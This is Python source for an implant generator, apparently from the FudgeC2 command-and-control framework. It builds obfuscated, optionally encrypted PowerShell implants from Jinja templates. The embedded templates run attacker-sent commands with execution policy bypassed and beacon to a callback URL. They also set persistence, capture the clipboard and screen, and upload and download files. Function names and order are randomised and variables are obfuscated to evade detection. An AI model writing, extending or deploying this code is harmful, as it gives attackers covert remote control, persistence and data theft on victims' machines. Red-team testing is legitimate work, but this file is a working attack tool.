import jinja2
import string
import random
import base64

from Implant.PSObfucate import PSObfucate
from Implant.ImplantFunctionality import ImplantFunctionality
from Implant.payload_encryption import PayloadEncryption
from NetworkProfiles.NetworkProfileManager import NetworkProfileManager


class ImplantGenerator:
    # ImplantGenerator has a single public method (generate_implant_from_template)
    #   which is used to generate a new active implant in the event of a stager
    #   calling back. Configuration from the implant template is used to determine
    #   which functionality should be embedded within the active implant.

    ImpFunc = ImplantFunctionality()
    NetProfMan = NetworkProfileManager()
    StaticEnc = PayloadEncryption()
    module_obfuscation_string = {}
    JinjaRandomisedArgs = {
        "obf_remote_play_audio": "RemotePlayAudio",
        "obf_sleep": "sleep",
        "obf_select_protocol": "select_protocol",
        "obf_collect_sysinfo": "collect-sysinfo",
        "obf_http_conn": "http-connection",
        "obf_https_conn": "https-connection",
        "obf_dns_conn": "dns-connection",
        "obf_create_persistence": "create-persistence",
        "obf_builtin_command": "execute-command",
        "obf_reg_key_name": "FudgeC2Persistence",
        "obf_callback_url": "url",
        "obf_callback_reason": "callback_reason",
        "obf_get_clipboard": "export-clipboard",
        "obf_load_module": "load-ext-module",
        "obf_invoke_module": "invoke-module",
        "obf_get_loaded_modules": "get-loaded-modules",
        "obf_upload_file": "upload-file",
        "obf_download_file": "download-file",
        "obf_screen_capture": "screen-capture",
        "obf_kill_date": "implant_kill_date",
        "obf_operating_hours": "working_time_function"
        }

    execute_command = '''
function {{ ron.obf_builtin_command }}($data){
    $a = $data.Substring(0,2)
    $global:command_id = $data.Substring(2,24)
    if ($data.Substring(26).length -gt 1){
        $b = [System.Convert]::FromBase64String($data.Substring(26))
    }
    if($a -eq "CM"){
        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes([System.Text.Encoding]::UTF8.GetString($b)))
        $global:tr = powershell.exe -exec bypass -EncodedCommand $c
    } elseif($a -eq "SI"){
        {{ ron.obf_collect_sysinfo }}
    } elseif ($a -eq "EP"){
        {{ ron.obf_create_persistence }}
    } elseif ($a -eq "PS"){
        {{ ron.obf_remote_play_audio }}($b)
    } elseif ($a -eq "EC"){ 
        {{ ron.obf_get_clipboard }} 
    } elseif ($a -eq "LM"){
        {{ ron.obf_load_module }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "IM"){
        {{ ron.obf_invoke_module }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "ML"){
        {{ ron.obf_get_loaded_modules }}  
    } elseif ($a -eq "FD"){
        {{ ron.obf_download_file }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "UF"){
        {{ ron.obf_upload_file }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "SC"){
        {{ ron.obf_screen_capture }}
    } else {
        $global:tr = $null
    }
}
'''

    kill_date = ''' 
function {{ ron.obf_kill_date }}{
    $kd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{{ kill_date_encoded }}"))
    $pdt = [datetime]::parseexact($kd, 'yyyy-MM-dd HH:mm:ss', $null)
    if ((Get-Date) -gt ($pdt)){
        [string]::join('',[ChaR[]](101, 120, 105, 116)) |& ((gv ‘*MDr*’).NamE[3,11,2] -join '')
    }  
}
'''
    operating_hours = '''
function {{ ron.obf_operating_hours }}(){
    while ($true){
        $start_string = "{{ operating_hours['oh_start'] }}:00"
        $stop_string =  "{{ operating_hours['oh_stop'] }}:00"
        $start = [datetime]::parseexact($start_string, 'HH:mm:ss', $null)
        $stop = [datetime]::parseexact($stop_string, 'HH:mm:ss', $null)
        if ($start -lt $stop){
            if( ( (get-date) -ge $start ) -And ((get-date) -le $stop) ){  
            return }
        } else {
            $stop = $stop.AddDays(1)
            if ( ((get-date) -lt $stop) -And ((Get-Date) -gt $start ) ) { 
                return
            }
        }
        start-sleep(3);
    }
}
'''

    select_protocol = '''
function {{ ron.obf_select_protocol }}($b){
    {% if operating_hours['oh_start'] is defined %}
{{ ron.obf_operating_hours }}
    {% endif %}
    {% if kill_date %}{{ ron.obf_kill_date }}{% endif %}
    sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
    return get-random($b)
}
'''

    implant_main = '''
{{ obf_variables }}
{% if obfuscation_level == 0 %}
# Implant generated by:
# https://github.com/Ziconius/FudgeC2
{% endif %}
$global:command_id = 0
start-sleep({{ initial_sleep }})
${{ ron.obf_sleep }}={{ beacon }}
${{ ron.obf_callback_url }} = "{{ url }}"
while($true){
    $plh=$null
    $global:headers = $null
    try {
    {{ proto_core }}
    } catch {
        $_.Exception | Out-Null
    }
    if (($global:headers -NotLike "==") -And ($global:headers -ne $null)){
        {{ ron.obf_builtin_command }}($global:headers)
        if ($global:tr -ne $null){ 
            $atr = $global:tr -join "`n"
            $plh = $atr
            try {
            {{ proto_core }}
            } catch {
                $_.Exception | Out-Null
            }
        }       
    }
}
'''

    def _manage_implant_function_order(self, implant_info, function_list):
        # -- This is responsible for randomising the function order within the generated implant.
        if implant_info['obfuscation_level'] >= 1:
            random.shuffle(function_list)
        constructed_base_implant = ""
        for implant_function in function_list:
            constructed_base_implant = constructed_base_implant + implant_function.rstrip()
        constructed_base_implant = constructed_base_implant + self.implant_main
        return constructed_base_implant.lstrip()

    def _function_name_obfuscation(self, implant_info, function_names):
        if implant_info['obfuscation_level'] >= 2:
            for key in function_names.keys():
                letters = string.ascii_lowercase
                temp_string = ''.join(random.choice(letters) for i in range(8))
                if temp_string not in function_names.values():
                    function_names[key] = temp_string
        return function_names

    def _process_modules(self, implant_data, randomised_function_names):
        # Add default functions to added to the implant which will be randomised.
        core_implant_functions = [
            self.execute_command,
            self.select_protocol
            ]

        implant_functions = self.ImpFunc.get_list_of_implant_text()
        implant_functions.extend(core_implant_functions)

        ports = {}
        network_profile_functions = {}
        for profile_name in implant_data['network_profiles']:
            code, variables = self.NetProfMan.get_implant_powershell_code(profile_name)

            obf_variables = variables[0]
            port_variables = variables[1]

            # code is now in the base
            implant_functions.append(code)
            # Args are now in the Network Profiles
            self.JinjaRandomisedArgs.update(obf_variables)
            network_profile_functions.update(obf_variables)

            for key in port_variables.keys():
                port_variables[key] = implant_data['network_profiles'][profile_name]
            ports.update(port_variables)

        if implant_data['kill_date'] is not None:
            implant_functions.append(self.kill_date)

        if len(implant_data['operating_hours']) == 2:
            implant_functions.append(self.operating_hours)

        constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)

        protocol_string = ""
        proto_count = 0
        for net_prof in network_profile_functions.keys():
            protocol_string += f"     {proto_count} {{ {network_profile_functions[net_prof]}($plh) }}\n"
            proto_count += 1

        f_str = f"switch ( {randomised_function_names['obf_select_protocol']}({proto_count})) {{" \
                f"\n{protocol_string}" \
                f"\n}}"

        return constructed_implant, f_str, ports

    def _encrypt_and_wrap_payload(self, implant_config, payload):
        # Check if encryption is needed:
        persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"

        for encryption_mode in implant_config['encryption']:
            if encryption_mode == "static_encryption":
                payload = self.StaticEnc.payload_encryption(payload)

        # Once the payload is encrypted (or not), it will be wrapped with the persistence variable at
        # the top of the file. This ensure that the encrypted payload is in persistence mechanisms.
        constructor = f"""{persistence_variable}
{payload}
"""
        return constructor

    def generate_implant_from_template(self, implant_data):
        """
        generate_implant_from_template
         - Takes the generated implant info (Generated implants (by UIK)

        _process_modules
         - This controls which protocols and additional modules are embedded into the implant.
         - Generates the main function multi proto selection
        """

        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
        implant_template, protocol_switch, ports = self._process_modules(implant_data, implant_function_names)

        # Collect the modules strings - these variables are to be used as function names internally.
        unobfuscated_modules_string = self.ImpFunc.get_obfucation_string_dict()
        obfuscated_modules_string = self._function_name_obfuscation(implant_data, unobfuscated_modules_string)

        callback_url = implant_data['callback_url']
        variable_list = ""
        if implant_data['obfuscation_level'] >= 3:
            ps_ofb = PSObfucate()
            variable_list, callback_url = ps_ofb.variableObs(implant_data['callback_url'])
        cc = jinja2.Template(implant_template)
        output_from_parsed_template = cc.render(
            initial_sleep=implant_data['initial_delay'],
            url=callback_url,
            ports=ports,
            uii=implant_data['unique_implant_id'],
            stager_key=implant_data['stager_key'],
            ron=implant_function_names,
            mod_obf=obfuscated_modules_string,
            beacon=implant_data['beacon'],
            proto_core=protocol_switch,
            obfuscation_level=implant_data['obfuscation_level'],
            obf_variables=variable_list,
            operating_hours=implant_data['operating_hours'],
            kill_date=implant_data['kill_date'],
            kill_date_encoded=base64.b64encode(str(implant_data['kill_date']).encode()).decode()
        )

        # Wrapping implant in function to allow Powershell scope to expose the implant code to itself
        func_name = f"{random.choice(string.ascii_lowercase)}_{random.choice(string.ascii_lowercase)}"
        unencrypted_implant = f"function {func_name}{{ {output_from_parsed_template} }};{func_name}"
        finalised_implant = self._encrypt_and_wrap_payload(implant_data, unencrypted_implant)
        return finalised_implant, unencrypted_implant
